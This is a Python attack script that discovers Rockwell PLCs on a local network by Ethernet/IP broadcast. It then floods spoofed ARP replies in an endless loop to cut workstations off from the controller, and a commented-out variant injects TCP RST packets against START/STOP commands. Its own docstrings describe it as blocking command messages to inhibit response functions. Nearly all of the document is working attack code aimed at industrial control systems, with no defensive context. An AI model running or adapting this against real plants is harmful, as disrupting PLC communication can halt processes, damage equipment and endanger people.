from scapy.all import *
from pycomm3 import CIPDriver
import time

def find_plc_ip():
    """
    Discover Rockwell PLCs by sending Ethernet/IP discovery packets.
    """
    print("[+] Scanning network for Rockwell PLCs...")

    # Send a Ethernet/IP broadcast to detect PLCs
    discovery_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / UDP(sport=44818, dport=44818)
    ans, _ = srp(discovery_pkt, timeout=3, verbose=False)

    for snd, rcv in ans:
        if rcv and "Rockwell" in str(rcv):
            plc_ip = rcv[IP].src
            print(f"[+] Found Rockwell PLC at {plc_ip}")
            return plc_ip
    print("[-] No PLC detected. Exiting.")
    return None


def block_command_message(plc_ip):
    """
    Block command messages to inhibit response functions by disrupting PLC communication.
    """
    print(f"[+] Starting command message blocking on {plc_ip}...")

    # Example: Spoof ARP to prevent workstation from reaching PLC (Denial of Service)
    while True:
        spoofed_arp_response = ARP(op=2, psrc=plc_ip, hwsrc="00:00:00:00:00:00", hwdst="ff:ff:ff:ff:ff:ff")
        send(spoofed_arp_response, verbose=False)
        print("[*] Sending spoofed ARP to block communications...")
        time.sleep(5)  # Repeat attack every 5 seconds

    # Another method: TCP Connection Reset
    # Filtering START/STOP command messages and injecting an RST packet to disrupt connection.
    # This requires monitoring active connections and disrupting them.

    # while True:
    #     packet = sniff(filter=f"host {plc_ip}", count=1)
    #     if "START" in str(packet) or "STOP" in str(packet):
    #         ip_layer = packet[IP]
    #         tcp_layer = packet[TCP]
    #         rst_pkt = IP(src=ip_layer.dst, dst=ip_layer.src) / TCP(sport=tcp_layer.dport, dport=tcp_layer.sport, flags="R")
    #         send(rst_pkt, verbose=False)
    #         print("[*] Blocking command message by injecting RST packet...")

if __name__ == "__main__":
    # 1. Find PLC IP
    plc_ip = find_plc_ip()

    # 2. If found, block its command messages
    if plc_ip:
        block_command_message(plc_ip)